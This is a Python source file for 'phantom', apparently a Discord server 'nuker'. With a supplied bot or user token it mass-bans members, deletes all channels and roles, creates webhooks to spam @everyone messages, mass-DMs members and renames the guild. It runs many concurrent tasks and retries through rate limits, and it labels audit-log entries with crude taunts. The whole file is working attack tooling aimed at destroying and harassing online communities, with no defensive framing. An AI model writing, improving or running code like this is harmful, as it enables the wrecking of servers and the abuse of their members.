import ctypes
import webbrowser as wb
from os import system, path, _exit
import random
try:
    from aiohttp import ClientSession
except ImportError:
    system('pip install aiohttp')
    from aiohttp import ClientSession
try:
    from pwinput import pwinput
except ImportError:
    system('pip install pwinput')
    from pwinput import pwinput
try:
    from pypresence import Presence
except ImportError:
    system('pip install pypresence')
    from pypresence import Presence
try:
    import httpx
except ImportError:
    system('pip install httpx')
    import httpx
try:
    from pystyle import Center
except ImportError:
    system('pip install pystyle')
    from pystyle import Center
try:
    from tasksio import TaskPool 
except ImportError:
    system('pip install tasksio')
    from tasksio import TaskPool 
try:
    import numpy as np
except ImportError:
    system('pip install numpy')
    import numpy as np
try:
    from colorama import Fore 
except ImportError:
    system('pip install colorama')
    from colorama import Fore 
try:
    from image import DrawImage
except ImportError:
    system('pip install terminal-img')
    from image import DrawImage

from asyncio import Queue, sleep as async_sleep, run
from random import randint, choice
from sys import platform, stdout, version_info
from time import strftime, sleep, time
from base64 import b64decode
from pystyle import Colors, Colorate, Center, Write
import util
import strings

if platform == "win32": 
    ctypes.windll.kernel32.SetConsoleTitleW("phantom- config")
    clear = system("cls & mode 143,40")
else:
    system("clear")


menu = '''
                                            ┌────┬────────────────────┐┌────┬────────────────────┐
                                            │ ## │ choice             ││ ## │ choice             │
                                            ├────┼────────────────────┤├────┼────────────────────┤
                                            │ #1 │ massban ids        ││ #4 │ delete channels    │
                                            │ #2 │ webhook spammer    ││ #5 │ create roles       │
                                            │ #3 │ create channels    ││ #6 │ delete roles       │
                                            └────┴────────────────────┘└────┴────────────────────┘
'''
logo = '''

                                        ██▓███    ██░ ██  ▄▄▄      ███▄    █ ▄▄▄█████▓ ▒█████    ███▄ ▄███▓
                                        ▓██░  ██ ▒▓██░ ██ ▒████▄    ██ ▀█   █ ▓  ██▒ ▓▒▒██▒  ██▒ ▓██▒▀█▀ ██▒
                                        ▓██░ ██▓▒░▒██▀▀██ ▒██  ▀█▄ ▓██  ▀█ ██▒▒ ▓██░ ▒░▒██░  ██▒ ▓██    ▓██░
                                        ▒██▄█▓▒ ▒ ░▓█ ░██ ░██▄▄▄▄██▓██▒  ▐▌██▒░ ▓██▓ ░ ▒██   ██░ ▒██    ▒██ 
                                        ▒██▒ ░  ░ ░▓█▒░██▓ ▓█   ▓██▒██░   ▓██░  ▒██▒ ░ ░ ████▓▒░▒▒██▒   ░██▒
                                        ▒▓▒░ ░  ░  ▒ ░░▒░▒ ▒▒   ▓▒█░ ▒░   ▒ ▒   ▒ ░░   ░ ▒░▒░▒░ ░░ ▒░   ░  ░
                                        ░▒ ░       ▒ ░▒░ ░  ░   ▒▒ ░ ░░   ░ ▒░    ░      ░ ▒ ▒░ ░░  ░      ░
                                        ░░         ░  ░░ ░  ░   ▒     ░   ░ ░   ░ ░    ░ ░ ░ ▒   ░      ░   
                                                ░  ░  ░      ░           ░              ░ ░  ░       ░   


> discord.gg/TB8hHfkaN7
> made by vqtws
'''
motds = ["you can't escape phantom", "proffesional kpop destroyer", "fuck skids | vqtws & max on top", "phantom runs you", "suck a big fat cock"]

def show_banner():
    util.clear_output()
    print(Colorate.Vertical(Colors.purple_to_blue, logo, 1))
    util.out(strings.motd_delims.replace("<X>", random.choice(motds)), True, True)
    print(Colorate.Vertical(Colors.purple_to_blue, menu, 1))

def show_banner2():
    util.clear_output()
    print(Colorate.Vertical(Colors.purple_to_blue, logo, 1))
    util.out(strings.motd_delims.replace("<X>", random.choice(motds)), True, True)

def ct(t):
    global user
    r = httpx.get(f"https://discord.com/api/v10/users/@me", headers={'authorization': f'Bot {t}'})
    if r.status_code == 200:
        user = r.json()
        return "bot"
    elif r.status_code == 401:
        r = httpx.get(f"https://discord.com/api/v10/users/@me", headers={'authorization': f'{t}'})
        if r.status_code == 200:
            user = r.json()
            return "user"
        else:
            print(Colorate.Vertical(Colors.purple_to_blue, f" invalid token, aborting..", 1))
            input()
            _exit(0)           
    else:
        print(Colorate.Vertical(Colors.purple_to_blue, f" invalid token, aborting..", 1))
        input()
        _exit(0)

def cg(g):
    r = httpx.get(f"https://discord.com/api/v10/guilds/{g}", headers={'authorization': f'Bot {t}'}) 
    if r.status_code == 200:
        return "exists"
    elif "Invalid Form Body" in r.json()['message']:
        print(Colorate.Vertical(Colors.purple_to_blue, f" invalid guild, aborting..", 1))
        input()
        _exit(0)
    elif r.status_code == 401:
        r = httpx.get(f"https://discord.com/api/v10/guilds/{g}", headers={'authorization': f'{t}'}) 
        if r.status_code == 200:
            return "exists"
        else:
            print(Colorate.Vertical(Colors.purple_to_blue, f" invalid guild, aborting..", 1))
            input()
            _exit(0)
    else:
        print(Colorate.Vertical(Colors.purple_to_blue, f" bot is not in guild, aborting..", 1))
        wb.open(f"https://discord.com/api/oauth2/authorize?client_id={user['id']}&permissions=8&scope=bot")
        input()
        _exit(0)

show_banner2()
if version_info.major == 3 and version_info.minor != 9:
    try:
        t = input(util.colorize('''
 enter bot authorization [token]:  '''))
        if t in ["secured", "usual"]:
            m = "".encode('ascii')
            z = b64decode(m)
            t = z.decode('ascii')
            bot = ct(t)
        else:
            bot = ct(t)
        g = input(util.colorize(" enter guild id:  "))
        guild = cg(g)
    except KeyboardInterrupt:
        _exit(0)
else:
    print(Center.XCenter("python must be 3.10+ \notherwise commands wouldn't work"))
    input()

try:
    id = '885644488452743168'
    RPC = Presence(id)
    RPC.connect()
    RPC.update(buttons=[{"label": "youtube", "url": "https://www.youtube.com/channel/UCgLInDOhbGTUzZylrXftKNw"}, {"label": "discord", "url": "https://discord.gg/TB8hHfkaN7"}], large_image='multitool', start=time(), large_text="v1.0.0")
except:
    pass

class phantom: 
    def __init__(self) -> None:
        self.__version__ = "1.2.5"
        self.token = t
        self.guild = g
        self.whitelisted = ["1062440467540750367", "1062366852807917688"]
        self.status = [200, 201, 204]
        self.ratelimit = 429
        self.tasks = 50
        self.queue = Queue()
        self.api = randint(9, 10)
        self.name = user['username']
        self.avatar = ["https://i.imgur.com/ruyWE1s.jpeg", "https://i.imgur.com/ruyWE1s.jpeg", "https://i.imgur.com/ruyWE1s.jpeg"]
        self.username = ['phantom', 'phantom-runs-this-shit', 'ran-by-phantom']
        self.num = 0

        self.p = Fore.MAGENTA
        self.w = Fore.WHITE
        if bot == "bot": 
            self.bot = "bot"
            self.headers = {'authorization': f'Bot {self.token}', 'x-audit-log-reason': 'fuckedbyphantom'}
        elif bot == "user":
            self.bot = "user"
            self.headers = {'authorization': f'{self.token}', 'x-audit-log-reason': 'fuckedbyphantom'}


    def log(self, type : None, text : str):
        match type:
            case "1":
                type = "created" 
            case "2":
                type = "deleted"
            case "3":
                type = "shipped"
            case "4":
                type = "banned"
            case "5":
                type = "unbanned"
            case "6":
                type = "renamed"
            case "0":
                type = "ratelimited for"

       # print(f"\t{self.p}[{self.w}{strftime('%H:%M:%S')}{self.p}]{self.w} ~ {type} {self.p}{text}")
        print(Colorate.Horizontal(Colors.rainbow, f" [{strftime('%H:%M:%S')}] ~ {type} {text}", 1))

    def err(self, t):
        print(Center.XCenter(f"\n{t}"))

    def title(self, t):
        if platform == "win32":
            ctypes.windll.kernel32.SetConsoleTitleW(t)
        elif platform == "linux":
            stdout.write(t)
        else:
            t = None

    def write(self, t, amnt : None):
        if amnt is None:
            amnt = 0.02
        for text in t:
            sleep(amnt)
            stdout.write(text)
            stdout.flush()

    def clear(self, cols : None, lines : None):
        if cols == None or lines == None:
            cols = "143"
            lines = "40"
        if platform == "win32": 
           system(f"cls & mode {cols},{lines}")
        else:
           system("clear")

    def reset(self):
        self.num = 0

    async def chg(self):
        global g
        self.guild = input(util.colorize('''
 guild: '''))
        g = cg(self.guild)
        if g == "exists":
            await self.startup()

    async def cht(self):
        global t
        self.token = input(util.colorize('''
 enter bot authorization [token]: '''))
        t = ct(self.token)
        if t == "bot":
            self.name = user['username']
            self.bot = "bot"
            await self.startup()
        elif t == "user":
            self.name = user['username']
            self.bot = "user"
            await self.startup()

    async def mb(self, m):
        while 1:
            async with ClientSession(headers=self.headers) as s:
                async with s.put(f"https://discord.com/api/v{self.api}/guilds/{self.guild}/bans/{m}") as r:
                    if "retry_after" in await r.text():
                        json = await r.json(content_type=None)
                        self.log(type="0", text=f"{json['retry_after']}s")
                    else:
                        if r.status in self.status:
                            self.log(type="4", text=m)
                            self.num += 1
                        elif r.status == self.ratelimit:
                            self.log(type="0", text=f"{json['retry_after']}s")    
                        break

    async def ub(self, m):
        while 1:
            async with ClientSession(headers=self.headers) as s:
                async with s.delete(f"https://discord.com/api/v{self.api}/guilds/{self.guild}/bans/{m}") as r:
                    if "retry_after" in await r.text():
                        json = await r.json(content_type=None)
                        self.log(type="0", text=f"{json['retry_after']}s")
                    else:
                        if r.status in self.status:
                            self.log(type="5", text=m)
                            self.num += 1
                        elif r.status == self.ratelimit:
                            self.log(type="0", text=f"{json['retry_after']}s")
                        break

    async def crw(self, ch):
        while 1:
            j = {'name': choice(self.username), "avatar_url": choice(self.avatar)}
            async with ClientSession(headers=self.headers) as s:
                async with s.post(f'https://discord.com/api/v{self.api}/channels/{ch}/webhooks', json=j) as r:
                    if r.status in self.status:
                        wh = await r.json(content_type=None)
                        self.log(type="1", text=f"{wh['id']}")
                    break
                        
    async def sndw(self, wh, msg, a, id):
        for _ in range(int(a)):
            j = {"content": msg, "username": choice(self.username), "avatar_url": choice(self.avatar)}
            async with ClientSession() as s:
                async with s.post(wh, json=j) as r:
                    json = await r.json(content_type=None)
                    if "retry_after" in await r.text():
                        self.log(type="0", text=f"{json['retry_after']}s")
                    else:
                        if r.status in self.status:
                            self.log(type="3", text=id)
                            self.num += 1
                        elif r.status == self.ratelimit:
                            self.log(type="0", text=f"{json['retry_after']}s")

    async def cc(self, n, t):
        while 1:
            j = {"name": n, "type": t}
            async with ClientSession(headers=self.headers) as s:
                async with s.post(f'https://discord.com/api/v{self.api}/guilds/{self.guild}/channels', json=j) as r:
                    json = await r.json(content_type=None)
                    if "retry_after" in await r.text():
                        self.log(type="0", text=f"{json['retry_after']}s")
                    else:
                        if r.status in self.status:
                            self.log(type="1", text=f"{json['id']}")
                            self.num += 1
                        elif r.status == self.ratelimit:
                            self.log(type="0", text=f"{json['retry_after']}s")
                        break

    async def dc(self, c):
        while 1:
            async with ClientSession(headers=self.headers) as s:
                async with s.delete(f"https://discord.com/api/v{self.api}/channels/{c}") as r:
                    json = await r.json(content_type=None)
                    if "retry_after" in await r.text():
                        self.log(type="0", text=f"{json['retry_after']}s")
                    else:
                        if r.status in self.status:
                            self.log(type="2", text=f"{json['id']}")
                            self.num += 1
                        elif r.status == self.ratelimit:
                            self.log(type="0", text=f"{json['retry_after']}s")
                        break

    async def cr(self, n): 
        while 1:
            j = {"name": n, "color": 0x662b71}
            async with ClientSession(headers=self.headers) as s:
                async with s.post(f'https://discord.com/api/v{self.api}/guilds/{self.guild}/roles', json=j) as r:
                    json = await r.json(content_type=None)
                    if "retry_after" in await r.text():
                        self.log(type="0", text=f"{json['retry_after']}s")
                    else:
                        if r.status in self.status:
                            self.log(type="1", text=f"{json['id']}")
                            self.num += 1         
                        elif r.status == self.ratelimit:
                            self.log(type="0", text=f"{json['retry_after']}s")
                        break

    async def dr(self, c):
        while 1:
            async with ClientSession(headers=self.headers) as s:
                async with s.delete(f"https://discord.com/api/v{self.api}/guilds/{self.guild}/roles/{c}") as r:
                    json = await r.json(content_type=None)
                    if "retry_after" in await r.text():
                        self.log(type="0", text=f"{json['retry_after']}s")
                    else:
                        if r.status in self.status:
                            self.log(type="2", text=c)
                            self.num += 1
                        elif r.status == self.ratelimit:
                            self.log(type="0", text=f"{json['retry_after']}s")
                        break

    async def dm(self, m, ch):
        while 1:
            j = {'content': m}
            async with ClientSession(headers=self.headers) as s:
                async with s.post(f"https://discord.com/api/v{self.api}/channels/{ch}/messages", json=j) as r:
                    json = await r.json(content_type=None)
                    if r.status in self.status:
                        self.log(type="3", text=f"{json['id']}")
                        self.num += 1
                    break

    async def cdm(self, u):
        self.ids = []
        while 1:
            j = {"recipient_id": u}
            async with ClientSession(headers=self.headers) as s:
                async with s.post(f"https://discord.com/api/v{self.api}/users/@me/channels", json=j) as r:
                    json = await r.json(content_type=None)
                    if r.status in self.status:
                        self.log(type="1", text=f"{json['id']}")
                        self.ids.append(json['id'])            
                    break

    async def rg(self, n):
        j = {'name': n}
        async with ClientSession(headers=self.headers) as s:
            async with s.patch(f"https://discord.com/api/v{self.api}/guilds/{self.guild}", json=j) as r:
                json = await r.json(content_type=None)
                if r.status in self.status:
                    self.log(type="6", text=json['id'])
                    self.num += 1

    async def mbexec(self):
        z = input(util.colorize('''
 ban ids? (y/n): '''))

        if z.startswith("y"):    
            self.clear(cols=143, lines=40)      
            self.title(f"phantom- massban (ids)")
            if path.exists('core/ids.txt'):
                members = open("core/ids.txt").read().split("\n")
            else:
                self.err("core/ids.txt dosen't exists")
                input()
                await self.menu()
            
            async with TaskPool(workers=self.tasks) as q:
                for m in np.array(list(members)):
                    if m in self.whitelisted:
                        self.log(type="skipped", text=f"{m}")
                    await q.put(self.mb(m))
                    try:
                        await self.queue.join()
                    except:
                        continue

        elif z.startswith("n"):
            self.clear(cols=143, lines=40)
            self.title("phantom- massban")

            async with TaskPool(workers=self.tasks) as q:
                async with ClientSession(headers=self.headers) as s:
                    async with s.get(f"https://discord.com/api/v{self.api}/guilds/{self.guild}/members?limit=1000") as r:
                        members = await r.json(content_type=None)

                for m in np.array(list(members)):
                    if m['user']['id'] in self.whitelisted:
                        self.log(type="skipped", text=f"{m}")
                    await q.put(self.mb(m['user']['id']))
                    try:
                        await self.queue.join()
                    except:
                        continue
        else:
            await self.menu()

        self.log(type="4", text=f"{self.num}/{len(members)} {self.w}users") #sef
        await async_sleep(1.5)

    async def ubexec(self):
        self.clear(cols=143, lines=40)
        self.title(f"phantom- massunban")

        async with TaskPool(workers=self.tasks) as q:
            async with ClientSession(headers=self.headers) as s:
                async with s.get(f"https://discord.com/api/v{self.api}/guilds/{self.guild}/bans") as r:
                    members = await r.json(content_type=None)

            for m in np.array(list(members)):
                await q.put(self.ub(m['user']['id']))        
                try:
                   await self.queue.join()
                except:
                    continue 
                
        self.log(type="5", text=f"{self.num}/{len(members)} {self.w}users")
        await async_sleep(1.5)

    async def whexec(self):
        m = input(util.colorize('''
 message: '''))
        a = input(util.colorize('''
 amount: '''))

        if not a.strip().isdigit():
            self.err("amount should be int")
            await async_sleep(2)
            await self.menu()

        elif a == "" or m == "":
            self.err("there's an empty input")
            await async_sleep(2)
            await self.menu()

        else:
            self.clear(cols=143, lines=40)
            self.title("phantom- webhook spam")

            if m in ["usual", "vile", "automatic"]:
                m = "@everyone vile was here https://www.youtube.com/channel/UCicG4fjprn6t_E1KMjR007A"
            
            elif "@everyone" not in m.split():
                m = m.replace(m, f"@everyone {m}")

            async with TaskPool(workers=self.tasks) as q:
                async with ClientSession(headers=self.headers) as s:
                    async with s.get(f"https://discord.com/api/v{self.api}/guilds/{self.guild}/channels") as r:
                        channels = await r.json(content_type=None)
        
                for ch in np.array(list(channels)):
                    await q.put(self.crw(ch['id']))  
                    try:
                        await self.queue.join()
                    except:
                        continue

            async with TaskPool(workers=self.tasks) as q:
                async with ClientSession(headers=self.headers) as s:
                    async with s.get(f"https://discord.com/api/v{self.api}/guilds/{self.guild}/webhooks") as r:
                        webhooks = await r.json(content_type=None)

                for wh in np.array(list(webhooks)):
                    whs = f"https://discord.com/api/webhooks/{wh['id']}/{wh['token']}"
                    await q.put(self.sndw(whs, m, a, wh['id']))
                    try:     
                        await self.queue.join()
                    except:
                        continue

            self.log(type="3", text=f"{self.num}/{int(a)*len(channels)} {self.w}messages")
            await async_sleep(1.5)

    async def dcexec(self):
        self.clear(cols=143, lines=40)
        self.title("phantom- delete channels")
        async with TaskPool(workers=self.tasks) as q:
            async with ClientSession(headers=self.headers) as s:
                async with s.get(f"https://discord.com/api/v{self.api}/guilds/{self.guild}/channels") as r:
                    channels = await r.json(content_type=None)

            for ch in np.array(list(channels)):
                await q.put(self.dc(ch['id']))
                try:
                    await self.queue.join()
                except:
                    continue

        self.log(type="2", text=f"{self.num}/{len(channels)} {self.w}channels")
        await async_sleep(1.5)

    async def ccexec(self):
        n = input(util.colorize('''
 name: '''))
        t = input(util.colorize('''
 text / voice: '''))
        a = input(util.colorize('''
 amount: '''))

        if not a.strip().isdigit():
            self.err("amount should be int")
            await async_sleep(2)
            await self.menu()

        elif n == "" or a == "":
            self.err("there's an empty input")
            await async_sleep(2)
            await self.menu()

        else:
            if t.startswith("t"):
                t = 0
            elif t.startswith("v"):
                t = 2
            else:
                t = 0

            self.clear(cols=143, lines=40)
            self.title("phantom- create channels")
            async with TaskPool(workers=self.tasks) as q:
                for _ in range(int(a)):
                    await q.put(self.cc(n, t))
                    try:
                        await self.queue.join()
                    except:
                       continue

            self.log(type="1", text=f"{self.num}/{int(a)} {self.w}channels")
            await async_sleep(1.5)

    async def drexec(self):
        self.clear(cols=143, lines=40)
        self.title("phantom- delete roles")
        async with TaskPool(workers=self.tasks) as q:
            async with ClientSession(headers=self.headers) as s:
                async with s.get(f"https://discord.com/api/v{self.api}/guilds/{self.guild}/roles") as r:
                    roles = await r.json(content_type=None)

            for r in np.array(list(roles)):
                await q.put(self.dr(r['id']))
                try:
                    await self.queue.join()
                except:
                    continue

        self.log(type="2", text=f"{self.num}/{len(roles)} {self.w}roles")
        await async_sleep(1.5)

    async def crexec(self):
        n = input(util.colorize('''
 name: '''))
        a = input(util.colorize('''
 amount: '''))

        if not a.strip().isdigit():
            self.err("amount should be int")
            await async_sleep(2)
            await self.menu()

        elif n == "" or a == "":
            self.err("there's an empty input")
            await async_sleep(2)
            await self.menu()

        self.clear(cols=143, lines=40)
        self.title("phantom- create roles")
        async with TaskPool(workers=self.tasks) as q:
            for _ in range(int(a)):
                await q.put(self.cr(n))
                try:
                    await self.queue.join()
                except:
                    continue

        self.log(type="1", text=f"{self.num}/{int(a)} {self.w}roles")
        await async_sleep(1.5)

    async def dmexec(self):
        m = input(util.colorize('''
 message: '''))

        if m == "":
            m = "got ran by phantom"

        self.clear(cols=143, lines=40)
        self.title("phantom- massdm")

        async with TaskPool(workers=self.tasks) as q:
            async with ClientSession(headers=self.headers) as s:
                async with s.get(f"https://discord.com/api/v{self.api}/guilds/{self.guild}/members?limit=1000") as r:
                    members = await r.json(content_type=None)

            for u in np.array(list(members)):
                await q.put(self.cdm(u['user']['id']))
                try:
                    await self.queue.join()
                except:
                    continue
        
        async with TaskPool(workers=self.tasks) as q:
            for u in np.array(self.ids):
                await q.put(self.dm(m, u))
                try:
                    await self.queue.join()
                except:
                    continue

        self.log(type="messaged", text=f"{self.num}/{len(members)} {self.w}members")
        await async_sleep(1.5)

    async def rexec(self):
        n = input(util.colorize('''
 guild name: '''))
        
        if n == "":
            self.err("there's an empty input")
            await async_sleep(2)
            await self.menu()

        else:
            self.clear(cols=143, lines=40)
            await self.rg(n)

    async def thread(self):
        x = input(util.colorize('''
 thread amount: '''))

        if not x.strip().isdigit():
            self.err("amount should be int")
            await async_sleep(2)
            await self.menu()
        elif 100 < int(x):
            if user['id'] != "1062366852807917688" or user['id'] != "1062440467540750367":
                self.err("you can't use threads above 100")
                await async_sleep(2)
                await self.menu()
            else:
                self.tasks = int(x)
        else:
            self.tasks = int(x)

    async def creds(self):
        self.clear(cols=None, lines=None)
        self.title(f"phantom- credits : v{self.__version__}")
        self.write(f"""\n
                   {self.p}[{self.w}discord{self.p}] {self.w}vqtws#1337
                   {self.p}[{self.w}youtube{self.p}] {self.w}vqtws""", amnt=0.000001)

        for i in range(8, -1, -1):
            await async_sleep(1)
            self.title(f"phantom- credits : {i}")

    async def menu(self):
        self.clear(cols=None, lines=None)
        self.title(f"phantom- {self.bot} : {self.name}")
        show_banner()
        op = input(util.colorize(f" phantom@choice: "))

        op = op.replace(" ", "-") 

        match op.split():
            case ["1" | "mb" | "massban"]:
                await self.mbexec()
                self.reset()
                await self.menu()
            case ["2" | "whspam" | "webhook-spam"]:
                await self.whexec()
                self.reset()
                await self.menu()
            case ["3" | "cc" | "create-channels"]:
                await self.ccexec()
                self.reset()
                await self.menu()    
            case ["4" | "dc" | "delete-channels"]:
                await self.dcexec()
                self.reset()
                await self.menu()
            case ["5" | "cr" | "create-roles"]:
                await self.crexec()
                self.reset()
                await self.menu()
            case ["6" | "dr" | "delete-roles"]:
                await self.drexec()
                self.reset()
                await self.menu()
            case ["7" | "massdm" | "dmall"]:
                await self.dmexec()
                self.reset()
                self.ids.clear()
                await self.menu()
            case ["8" | "ub" | "massunban" | "unbanall"]:
                await self.ubexec()
                self.reset()
                await self.menu()
            case ["9" | "rename"]:
                await self.rexec()
                sleep(0.3)
                await self.menu()
            case ["thread" | "threads" | "change-threads" | "tasks"]:
                await self.thread()
                sleep(0.3)
                await self.menu()
            case ["cls" | "clear"]:
                self.clear(cols=None, lines=None)
                await self.menu()
            case ["chg" | "change-guild" | "guild"]:
                await self.chg()
            case ["cht" | "change-token" | "token"]:
                await self.cht()
            case _:
                self.err(f"{op} : command not found")
                await async_sleep(1)
                await self.menu()

    async def startup(self):
        self.clear(cols=60, lines=26)
        self.title(" ")
        try:
            if path.exists('core/phantom.jpeg'):
                image = DrawImage.from_file("core/phantom.jpeg")
                image.draw_image()
                await async_sleep(1.5)
                await self.menu()
            else:
                image = DrawImage.from_url("https://i.imgur.com/ruyWE1s.jpeg")
                image.draw_image()
                await async_sleep(1.5)
                await self.menu()
        except (Exception, RuntimeError, TypeError) as e:
            self.err(e)
        except KeyboardInterrupt:
            _exit(0)

if __name__ == "__main__":
    try:
        phantom().title("phantom- booting up")
        run(phantom().startup())
    except KeyboardInterrupt:
        _exit(0)
